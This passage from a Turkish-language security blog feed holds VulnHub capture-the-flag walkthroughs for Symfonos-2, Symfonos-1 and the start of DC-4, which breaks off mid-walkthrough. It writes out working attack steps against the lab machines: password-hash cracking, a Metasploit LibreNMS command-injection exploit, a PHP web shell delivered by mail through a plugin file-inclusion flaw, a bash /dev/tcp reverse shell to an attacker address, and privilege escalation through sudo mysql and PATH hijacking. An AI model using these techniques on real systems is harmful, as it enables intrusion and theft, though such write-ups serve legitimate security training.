<p>ftp portuna bağlanırlır. Shadow.bak ve passwd dosyaları şifresiz erişime açık olan backups klasörüne kopyalanır. Samba servisinden dosyalar indirilerek hesap şifreleri sözlük saldırısı yapılarak elde edilir.</p>
<p><em>Not: Shell almak için web dizinine dosya upload edilemeye çalışıldığında hata ile karşılaşılmıştır. Web dizini root yetkisindedir.</em></p>

    <img src="/images/vulnhub/symfonos2/ftp.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Unshadow aracı ile elde edilen hesap bilgileri sözlük saldırısı için uygun formata getirilir.<em>(shadow.bak -&gt; pass olarak kayıt edilmiştir.)</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">unshadow passwd.bak pass &gt; crack
</code></pre></div><p>John ile sözlük saldırısı yapılır. <strong>aeolus</strong> kullancısının hesap parolası elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt crack 
</code></pre></div>
    <img src="/images/vulnhub/symfonos2/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Aeolus kullanıcısı bilgileri ile ssh bağlantısı yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh aeolus@192.168.56.115
</code></pre></div>
    <img src="/images/vulnhub/symfonos2/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>LinEnum betiği ile sistem hakkında bilgi toplanır. Network bağlantıları dikkatli incelendiğinde 3306, 8080 ve 25 numaralı portlar localde çalışan uygulamalara ait açık portlardır. 25. portta Exim mail servisi, 3306 portta mysql servisi ve 8080 portunda Apache web servisi çalışmaktadır.</p>
<p>Portlar dışarıya açık olmadığından portlara erişim <strong>ssh tüneli</strong> ile sağlanmalıdır. Bu kapsamda shh ile port yönlendirme yapılır. Kendi bilgisayarımızda 8080 portu ssh ile bağlanılılan makinada 8080 portuna yönlendirilmiştir.</p>

    <img src="/images/vulnhub/symfonos2/network.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh  -L  8080:localhost:8080 aeolus@192.168.56.115
</code></pre></div><p>Bağlantıdan sonra tarayıcından <em>localhost:8080</em> adresine istek atılarak çalışan apache servisine bağlanılır. LibreNMS adında ağ izleme aracı çalışmaktadır. aeolus kullanıcısına ait bilgiler ile giriş yapılır.</p>

    <img src="/images/vulnhub/symfonos2/libre.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Metasploit aracı içerisinde yazılıma ait 2 adet exploit bulunmaktadır.</p>
<pre><code class="language-terminal" data-lang="terminal">msf6 &gt; search librenms

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/linux/http/librenms_addhost_cmd_inject   2018-12-16       excellent  No     LibreNMS addhost Command Injection
   1  exploit/linux/http/librenms_collectd_cmd_inject  2019-07-15       excellent  Yes    LibreNMS Collectd Command Injection

</code></pre><p>İlk sıradaki exploit seçilir. Ayarlara bakılır.</p>
<pre><code class="language-terminal" data-lang="terminal">msf6 &gt; use 0
[*] Using configured payload cmd/unix/reverse
msf6 exploit(linux/http/librenms_addhost_cmd_inject) &gt; options

Module options (exploit/linux/http/librenms_addhost_cmd_inject):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password for LibreNMS
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base LibreNMS path
   USERNAME                    yes       User name for LibreNMS
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux
</code></pre><p>Gerekli parametreler girilerek exploit çalıştırılır.</p>
<pre><code class="language-terminal" data-lang="terminal"> &gt; set username aeolus
 &gt; set rhosts 127.0.0.1
 &gt; set rport 8080
 &gt; set password sergioteamo
 &gt; set lhost 192.168.56.105
</code></pre><p>Exploit çalıştırıldığında Cronus adlı kullanıcı ile terminal bağlantısı sağlanır.</p>
<p><em>Not: LinEnum ile yapılan keşifte de 8080 portunda çalışan Apache servisi Cronus kullanıcısı yetkisi ile çalışmaktadır.</em></p>
<pre><code class="language-terminal" data-lang="terminal">msf6 exploit(linux/http/librenms_addhost_cmd_inject) &gt; run

[*] Started reverse TCP double handler on 192.168.56.105:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname LLOYBQ
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname LLOYBQ and id #1
[*] Command: echo 4bqnipl207sgGUKw;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: &quot;4bqnipl207sgGUKw\r\n&quot;
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.56.105:4444 -&gt; 192.168.56.115:57248) at 2020-10-05 14:39:26 -0500


id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
</code></pre><p>Sistem hakkında cronus kullanıcısı yetkileri ile tekrar bilgi toplamak için LinEnum betiği çalıştırılabilir. Ben genelde sistemde ilk olarak sudo yetkilerini kontrol ederim. Kontrol sonucunda mysql uygulamasının root yetkisi ile çalıştırılabildiği görülmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> cronus on symfonos2:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin

User cronus may run the following commands on symfonos2:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/mysql
</code></pre></div><p><code>sudo mysql -e '\! /bin/sh'</code> komutu kullanılarak root yetkisi ile terminal bağlantısı sağlanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
ls -lsa /root
total <span style="color:#ae81ff">28</span>
<span style="color:#ae81ff">4</span> drwx------  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">22</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> ..
<span style="color:#ae81ff">0</span> lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .bash_history -&gt; /dev/null
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .config
<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .local
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1444</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> proof.txt
bash -i
bash: cannot set terminal process group <span style="color:#f92672">(</span>514<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
root@symfonos2:/opt/librenms/html#
</code></pre></div><p>Proof.txt dosyası okunarak makina çözümleme işlemi tamalanır.</p>

    <img src="/images/vulnhub/symfonos2/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB Symfonos-1 Write up</title>
            <link>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-1-write-up/</link>
            <pubDate>Sun, 04 Oct 2020 18:13:49 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-1-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan Symfonos-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
İlk olarak tasarımcı tarafından belirtilen alan adı /etc/hosts dosyasına ip adresi symfonos.local şeklinde eklenir.
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/symfonos-1,322/">VULNHUB</a> &lsquo;da yer alan Symfonos-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
<p>İlk olarak tasarımcı tarafından belirtilen alan adı <em>/etc/hosts</em> dosyasına <code>ip adresi  symfonos.local</code> şeklinde eklenir.</p>

    <img src="/images/vulnhub/symfonos1/desc.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.114
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 07:36 CDT
Nmap scan report for 192.168.56.114 (192.168.56.114)
Host is up (0.00011s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:47:66:4F (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h39m59s, deviation: 2h53m12s, median: 2h59m59s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2020-10-03T10:36:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-03T15:36:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
</code></pre><p>İlk göze çarpan 139 ve 445 numaralı portlarda çalışan Samba ve 25 numaralı portta çalışan mail servisidir.</p>
<p>Samba servisinde paylaşıma açık olan dosya ve klasörler <em>smbclient</em> ile kontrol edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient  -L //192.168.56.114/
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/smb1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Şifresiz paylaşıma açık olan anonymous dizini kontrol edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient //192.168.56.114/anonymous
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/smb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>get</strong> komutu ile dosya indirilir ve içeriği görüntülenir.</p>

    <img src="/images/vulnhub/symfonos1/atten.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Zeus efendi kullanıcıların aynı parolaları kullanmalarından epeyce kızmış anlaşılan&hellip; 🤣</p>
<p>helios klasörüne <em>qwerty</em> parolası ile erişim sağlanmaktadır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient  //192.168.56.114/helios -U helios
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/smb3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Paylaşılan dosyalar get komutu ile indirilir ve içerikleri görüntülenir. Yapılacaklar adlı dosyada <strong>/h3l105</strong> dizini dikkat çekmektedir.</p>

    <img src="/images/vulnhub/symfonos1/todo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Tarayıcı ile web servisine istek atılır. Açılan sayfada sadece bir resim vardır. Daha sonra elde edilen dizine (<code>http://symfonos.local/h3l105</code>) istek atıldığında wordpress uygulaması karşımıza çıkmaktadır.</p>

    <img src="/images/vulnhub/symfonos1/web2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Wpscan</strong> aracı ile web sayfasında tarama yapılır. Wordpress sürümü, sistemdeki kullanıcılar vb. bir çok bilgi tespit edilir. Upload klasörünün erişime açık olduğu bilgisi dikkat çekmektedir.</p>

    <img src="/images/vulnhub/symfonos1/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Uploads klasörüne girildiğinde <strong>siteeditor</strong> adında klasör görülmektedir. Yapılan araştırma wordpress plugin olduğu ve uygulamaya ait <em>LFI</em> açığı olduğu tespit edilmektedir.</p>

    <img src="/images/vulnhub/symfonos1/expdb.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Exploit detaylarına bakıldığında lfi zafiyetinin olduğu dizin ve parametreler aşağıda görülmektedir.</p>

    <img src="/images/vulnhub/symfonos1/expdb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>/etc/passwd dosyasını okunmaya çalışılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
</code></pre></div><p>
    <img src="/images/vulnhub/symfonos1/lfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


Bu aşamadan sonra mail servisinde keşif yapılır. smtp-user-enum aracı ile helios kullanıcısı doğrulaması gerçekleştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smtp-user-enum -u helios -t 192.168.56.114
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Oct  3 08:13:56 2020 #########
192.168.56.114: helios exists
######## Scan completed at Sat Oct  3 08:13:56 2020 #########
1 results.

1 queries in 1 seconds (1.0 queries / sec)
</code></pre><p><strong>Helios</strong> kullanıcısına mail servisinden zararlı kodun bulunduğu bir mail gönderilir. LFI ile mail okunarak zararlı kod çalıştırılır.</p>
<p>İlk olarak <strong>nc</strong> veya <strong>telnet</strong> ile smtp servisine bağlanılır.</p>
<pre><code class="language-terminal" data-lang="terminal">nc 192.168.56.114 25
</code></pre><pre><code>**En önemli SMTP komutları aşağıdaki gibidir.

HELP: Komutlar listelenir.
HELO: SMTP sunucusu ile SMTP iletişimi başlatılır.
EHLO: Genişletilmiş SMTP iletişimi için kullanılır.
AUTH: İstemcinin kimlik doğrulaması için kullanılır.
MAIL FROM: E-posta göndericisi belirtilir.
RCPT TO: E-posta alıcısı belirtilir.
DATA: E-postanın içeriği belirtilir. E-posta içeriği, “.” ifadesi içeren satır ile tamamlanmış olur.
SUBJECT: E-postanın konusu belirtilir.
QUIT: Oturum sonlandırılır.
VRFY: E-posta kutusu alıcısı doğrulanır.
EXPN: E-posta listesi doğrulanır.
STARTTLS: SMTP iletişimi TLS üzerinden başlatılır.
RSET: E-posta iletişimi kesilir.
</code></pre>
<p>Yukarıdaki komutlar çerçevesinde root kullanıcısından helios kullanıcısına cmd parametresi ile gönderilen komutun çalıştırılabileceği php kodu gönderilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span>
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ nc 192.168.56.114 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
helo symfonos@localdomain
250 symfonos.localdomain
mail from:root@symfonos.localdomain
250 2.1.0 Ok
rcpt to:helios@symfonos.localdomain
250 2.1.5 Ok
data
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
&lt;?php echo system($_REQUEST[&quot;cmd&quot;]); ?&gt;
.
250 2.0.0 Ok: queued as D547140698
</code></pre><p>Tarayıcından <em>/var/mail/</em> dizini altında helios kullanıcısının maillerinin tutulduğu helios dosyası okunarak zararlı kod çalıştırılır. İlk olarak <em><strong>cmd=ls -l</strong></em> test edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios<span style="color:#960050;background-color:#1e0010">&amp;</span>cmd=ls -l
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/lfi2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p><code>cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1'</code> şeklinde istek atılarak  4444 numaralı porttan <strong>helios</strong> kullanıcısı yetkisi ile terminal bağlantısı sağlanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">../ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;cmd=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1&#39;
</code></pre></div><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Python pty modülü kullanılarak etkileşimli kabuğa geçilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>İlk olarak <code>sudo -l</code> komutu çalıştırıldığında, komut bulunamadı hatası ile karşılaşılır. Sistem de suid biti aktif dosyalar için araştırma yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/suid.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>/opt dizini altında yer alan <strong>statuscheck</strong> adlı uygulama dikkat çekmektedir. Dosya sahibinin root olduğu görülmektedir.</p>

    <img src="/images/vulnhub/symfonos1/own.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Uygulama çalıştırıldığında apache sunucusuna istek atıldığı dönen paketin header bilgisinin ekrana basıldığı görülmektedir. Strings aracı ile uygulama içerisinde yer alan string ifadeler çıkarılır.</p>

    <img src="/images/vulnhub/symfonos1/content.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Curl komutu ile localhosta istek atıldığı görülmektedir. Ayrıca curl komutu için tam path verilmemiştir. Bu kapsamda;</p>
<ol>
<li><em>/home/helios</em> dizininde curl adında bir dosya oluşturulur.</li>
<li><em><strong>curl</strong></em> dosyası içerisine shell oturumu için kodlar eklenir.</li>
<li><strong>PATH</strong> değişkeninin başına curl dosya pathi eklenir.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; curl
export PATH<span style="color:#f92672">=</span>/home/helios:$PATH
/opt/statuscheck
</code></pre></div><p>Dosya çalıştırıldığında root yetkisi ile oturum elde edilir.</p>

    <img src="/images/vulnhub/symfonos1/priv.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Proof.txt okunarak makina çözümleri tamamlanır.</p>

    <img src="/images/vulnhub/symfonos1/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-4 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/vulnhub-dc-4-write-up/</link>
            <pubDate>Sat, 03 Oct 2020 13:30:54 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-dc-4-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan DC-4 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.113  80 portunda çalışan web servisine tarayıcından istek atılır.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/dc-4,313/">VULNHUB</a> &lsquo;da yer alan DC-4 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc4/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.113
</code></pre></div>
    <img src="/images/vulnhub/dc4/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>80 portunda çalışan web servisine tarayıcından istek atılır.</p>

    <img src="/images/vulnhub/dc4/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Web dizin taraması yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/dirb/big.txt -x php,txt
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.113
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/10/02 08:33:12 Starting gobuster
===============================================================
/command.php (Status: 302)
/css (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 302)
/logout.php (Status: 302)
===============================================================
2020/10/02 08:33:26 Finished
===============================================================
</code></pre><p>Index.php sayfasının login.php sayfasına yönlendirilmiştir. Sqlmap ile login sayfasında Sql Injection açığı için kontrol edildiğinde herhangi bir zafiyet görülmektedir. Login sayfasına admin kullanıcısı için brute-force saldırısı yapılır. Admin kullanıcısı için happy parola bilgisi elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz -c -z file,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt --hs incorrect -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> http://192.168.56.113/login.php
</code></pre></div>
    <img src="/images/vulnhub/dc4/force.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Admin kullanıcısı ile giriş yapılır.</p>

    <img src="/images/vulnhub/dc4/admin.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Command sayfasına giriş yapılır.</p>

    <img src="/images/vulnhub/dc4/commandpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


